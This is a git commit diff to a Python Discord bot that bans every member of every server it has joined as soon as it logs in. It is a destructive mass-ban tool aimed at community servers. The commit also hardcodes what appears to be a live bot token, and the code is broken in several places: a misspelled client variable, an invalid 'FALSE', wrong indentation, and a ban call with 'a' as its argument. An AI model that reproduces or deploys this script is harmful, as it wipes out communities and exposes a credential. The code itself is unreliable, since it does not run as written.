19dfffe4f21b5822c11a5d6f154b78d18b9205d0
Slow-a <67472840+Slow-a@users.noreply.github.com>
2020-07-12 02:04:39 -0300

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,6 +1,6 @@
 import discord
 
-TOKEN = ""   #TOKEN MUST BE PLACED INSIDE THE DOUBLE QUOTES
+TOKEN = "NzMxNzIyMzM4ODYwNjYyODY1.XwqZ0w.eFlVLj5m-EGrBO2vMmJLwkAZj9c"   
 
 SKIP_BOTS=FALSE
 
@@ -8,12 +8,12 @@ cliet =discord.Client()
 
 @client.event
 async def on_ready():
-print('Logged in as '+client.user.name+' (ID:'+client.user.id+') | Connected to '+str(len(client.servers))+' servers | Connected to '+str(len(set(client.get_all_members())))+' users')
+print('a')
 print('Created By Ravi')
 for member in client.get_all_members():
         if member.bot and SKIP_BOTS:
             continue
-        await member.ban(reason="Banned by BanBot", delete_message_days=7)
+        await member.ban('a')
         print(f"Banned {member.display_name}!")
     print("Banning is complete!")
 
